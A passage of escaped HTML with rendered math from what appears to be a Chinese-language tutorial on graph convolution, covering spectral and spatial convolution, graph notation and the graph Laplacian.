class=\"mord mathrm mtight\" style=\"margin-right:0.07778em;\">f</span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0500050000000003em;\"><span style=\"top:-1.8999949999999999em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">n</span></span></span></span><span style=\"top:-3.050005em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.386113em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.669545500000001em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<h3 id=\"定义卷积的两个方法\"><a class=\"anchor\" href=\"#定义卷积的两个方法\">#</a> 定义卷积的两个方法</h3>\n<h4 id=\"谱方法\"><a class=\"anchor\" href=\"#谱方法\">#</a> 谱方法</h4>\n<p>基于傅里叶变换用卷积订立将卷积操作转化为频域中的乘法操作：</p>\n<ul>\n<li>\n<p><strong>傅里叶变换</strong>：将输入信号和卷积核从时域转到频域，分别得到它们的傅里叶变换：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>F</mi><mo stretchy=\"false\">(</mo><mi>u</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi mathvariant=\"script\">F</mi><mo stretchy=\"false\">{</mo><mi>f</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">}</mo><mspace linebreak=\"newline\"></mspace><mi>H</mi><mo stretchy=\"false\">(</mo><mi>u</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi mathvariant=\"script\">F</mi><mo stretchy=\"false\">{</mo><mi>h</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">}</mo></mrow><annotation encoding=\"application/x-tex\">F(u)=\\mathcal{F}\\{f(x)\\}\\\\H(u)=\\mathcal{F}\\{h(x)\\}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">u</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.09931em;\">F</span></span><span class=\"mopen\">{</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mclose\">}</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">u</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.09931em;\">F</span></span><span class=\"mopen\">{</span><span class=\"mord mathnormal\">h</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mclose\">}</span></span></span></span></span></p>\n</li>\n<li>\n<p><strong>频域乘法</strong>：在频域中对两个傅里叶变换结果进行逐点相乘：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>G</mi><mo stretchy=\"false\">(</mo><mi>u</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>F</mi><mo stretchy=\"false\">(</mo><mi>u</mi><mo stretchy=\"false\">)</mo><mo>⋅</mo><mi>H</mi><mo stretchy=\"false\">(</mo><mi>u</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">G(u)=F(u)\\cdot H(u)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">u</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">u</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">u</span><span class=\"mclose\">)</span></span></span></span></span></p>\n</li>\n<li>\n<p><strong>逆傅里叶变换</strong>：将乘积结果通过逆傅里叶变换转换回时域：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>g</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><msup><mi mathvariant=\"script\">F</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy=\"false\">{</mo><mi>G</mi><mo stretchy=\"false\">(</mo><mi>u</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">}</mo></mrow><annotation encoding=\"application/x-tex\">g(x)=\\mathcal{F}^{-1}\\{G(u)\\}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1141079999999999em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.09931em;\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.864108em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mopen\">{</span><span class=\"mord mathnormal\">G</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">u</span><span class=\"mclose\">)</span><span class=\"mclose\">}</span></span></span></span></span></p>\n</li>\n</ul>\n<h4 id=\"空间方法\"><a class=\"anchor\" href=\"#空间方法\">#</a> 空间方法</h4>\n<p>​\t空间方法直接在信号或图像的空间域中进行卷积运算，通过滑动窗口逐点计算卷积结果。</p>\n<ul>\n<li>\n<p>** 翻转卷积核：** 将卷积核在空间域内翻转：<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>h</mi><mo stretchy=\"false\">(</mo><mo>−</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">h(-x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mopen\">(</span><span class=\"mord\">−</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span></p>\n</li>\n<li>\n<p><strong>滑动窗口</strong>：将翻转后的卷积核逐点滑动到输入信号的每一个位置</p>\n</li>\n<li>\n<p><strong>加权求和</strong>：对每一个位置上的输入信号与卷积核对应元素进行加权求和：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>g</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mo stretchy=\"false\">(</mo><mi>f</mi><mo>∗</mo><mi>h</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><munder><mo>∑</mo><mi>a</mi></munder><mi>f</mi><mo stretchy=\"false\">(</mo><mi>a</mi><mo stretchy=\"false\">)</mo><mi>h</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo>−</mo><mi>a</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">g(x)=(f*h)(x)=\\sum_af(a)h(x-a)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mclose\">)</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.3000100000000003em;vertical-align:-1.250005em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.8999949999999999em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">a</span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.250005em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">a</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">h</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mclose\">)</span></span></span></span></span></p>\n<p>对于二维图像，卷积计算也可以表示为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>g</mi><mo stretchy=\"false\">(</mo><mi>i</mi><mo separator=\"true\">,</mo><mi>j</mi><mo stretchy=\"false\">)</mo><mo>=</mo><munder><mo>∑</mo><mi>m</mi></munder><munder><mo>∑</mo><mi>n</mi></munder><mi>f</mi><mo stretchy=\"false\">(</mo><mi>i</mi><mo>−</mo><mi>m</mi><mo separator=\"true\">,</mo><mi>j</mi><mo>−</mo><mi>n</mi><mo stretchy=\"false\">)</mo><mi>h</mi><mo stretchy=\"false\">(</mo><mi>m</mi><mo separator=\"true\">,</mo><mi>n</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">g(i,j)=\\sum_m\\sum_nf(i-m,j-n)h(m,n)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">i</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.3000100000000003em;vertical-align:-1.250005em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.8999949999999999em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.250005em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.8999949999999999em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.250005em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">i</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">h</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span></span></span></span></span></p>\n</li>\n</ul>\n<h2 id=\"图节点\"><a class=\"anchor\" href=\"#图节点\">#</a> 图节点</h2>\n<h3 id=\"普通图\"><a class=\"anchor\" href=\"#普通图\">#</a> 普通图</h3>\n<p>给定一个图<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mi>V</mi><mo separator=\"true\">,</mo><mi>E</mi><mo separator=\"true\">,</mo><mi>W</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">G=(V,E,W)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mclose\">)</span></span></span></span>，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 是节点特征矩阵，那么可以定义如下：</p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>V</mi></mrow><annotation encoding=\"application/x-tex\">V</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span></span></span></span> 是节点集，包含<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mo>=</mo><mi mathvariant=\"normal\">∣</mi><mi>V</mi><mi mathvariant=\"normal\">∣</mi></mrow><annotation encoding=\"application/x-tex\">n=|V|</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"mord\">∣</span></span></span></span> 个节点</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>E</mi></mrow><annotation encoding=\"application/x-tex\">E</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span></span></span></span> 是边集，表示节点之间的连接关系</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">W</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span></span></span></span> 是<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi mathvariant=\"double-struck\">R</mi><mrow><mi>n</mi><mo>×</mo><mi>n</mi></mrow></msup></mrow><annotation encoding=\"application/x-tex\">\\mathbb{R}^{n\\times n}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.771331em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">R</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.771331em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\">n</span></span></span></span></span></span></span></span></span></span></span></span> 中的加权邻接矩阵，表示节点之间边的权重</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 是<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi mathvariant=\"double-struck\">R</mi><mrow><mi>n</mi><mo>×</mo><mi>d</mi></mrow></msup></mrow><annotation encoding=\"application/x-tex\">\\mathbb{R}^{n\\times d}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8491079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">R</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8491079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\">d</span></span></span></span></span></span></span></span></span></span></span></span> 中的节点特征矩阵，每个节点关联<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">d</span></span></span></span> 个特征。矩阵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 的每一列是定义在节点上的一个信号。</li>\n</ul>\n<h3 id=\"图拉普拉斯\"><a class=\"anchor\" href=\"#图拉普拉斯\">#</a> 图拉普拉斯</h3>\n<p><strong>普通图拉普拉斯矩阵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>L</mi></mrow><annotation encoding=\"application/x-tex\">L</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span></span></span></span> 定义为</strong>:</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>L</mi><mo>=</mo><mi>D</mi><mo>−</mo><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">L=D-W\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span></span></span></span></span></p>\n<p>其中:</p>\n<ul>\n<li>$D <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>是度矩阵（</mtext><mi>D</mi><mi>e</mi><mi>g</mi><mi>r</mi><mi>e</mi><mi>e</mi><mi>M</mi><mi>a</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>x</mi><mtext>），是一个对角矩阵，且</mtext></mrow><annotation encoding=\"application/x-tex\">是度矩阵（Degree Matrix），是一个对角矩阵，且</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">度</span><span class=\"mord cjk_fallback\">矩</span><span class=\"mord cjk_fallback\">阵</span><span class=\"mord cjk_fallback\">（</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">x</span><span class=\"mord cjk_fallback\">）</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">对</span><span class=\"mord cjk_fallback\">角</span><span class=\"mord cjk_fallback\">矩</span><span class=\"mord cjk_fallback\">阵</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">且</span></span></span></span> D_{ii}=\\sum_{j} W_{ij}<span 